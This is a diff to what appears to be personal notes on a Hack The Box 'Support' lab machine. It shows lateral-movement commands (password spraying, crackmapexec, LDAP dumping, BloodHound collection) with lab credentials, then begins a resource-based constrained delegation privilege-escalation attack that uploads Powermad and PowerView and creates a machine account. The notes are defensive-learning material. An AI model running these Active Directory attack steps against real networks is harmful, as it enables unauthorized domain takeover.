@@ -241,7 +241,7 @@ kerbrute_linux_amd64 passwordspray usernames 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%l
 >[!example]- Result
 >![[Pasted image 20250225154148.png]]
 
-## Lateral Movement
+# Lateral Movement
 ### Ldap (Using creds)
 - if we looking for information about the found users, we can see something interesting in the user 'support'
 ```bash
@@ -262,7 +262,7 @@ crackmapexec smb 10.10.11.174 -u 'support' -p 'Ironside47pleasure40Watchful'
 ldapdomaindump 10.10.11.174 -u 'support\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --authtype SIMPLE
 ```
 
-or (and then import the result into [[BloodHound]])
+or (and then import the result into [[BloodHaund]])
 ```bash
 bloodhound-python -d support.htb -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -c ALL -ns 10.10.11.174 --dns-tcp
 ```
@@ -283,3 +283,28 @@ crackmapexec winrm 10.10.11.174 -u 'support' -p 'Ironside47pleasure40Watchful'
 >[!example]- Result
 >![[Pasted image 20250225165347.png]]
 
+# Privilege Escalation
+- If we check the [[BloodHaund]] diagram we can see that we are part of the group 'shared support accounts' and if we check this group, we see that have full control over the DC0 (DC machine)
+>[!example]- Result
+>![[Pasted image 20250225172951.png]]
+
+### RBCD (resource based constrained delegation attack)
+- To perform this attack we are going to use [[rcbd.py]], more info [here](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/resource-based-constrained-delegation.html#attack), first, we crate a computer object inside domaing using [[powermad]], so upload [[powermad]] and [[PowerView]] to the victim machine
+```bash
+upload /home/jr117/Desktop/jr117/herramientas/Powermad
+upload /home/jr117/Desktop/jr117/herramientas/PowerTools/PowerView
+Import-Module ./Powermad/Powermad.ps1
+Import-Module ./PowerView/powerview.ps1
+```
+>[!example]- Result
+>![[Pasted image 20250225180025.png]]
+
+- now lets create the machine account (remember de name and the password)
+```bash
+New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
+```
+>[!example]- Result
+>![[Pasted image 20250225180440.png]]
+
+>[!info]- we can check it using powerview
+>
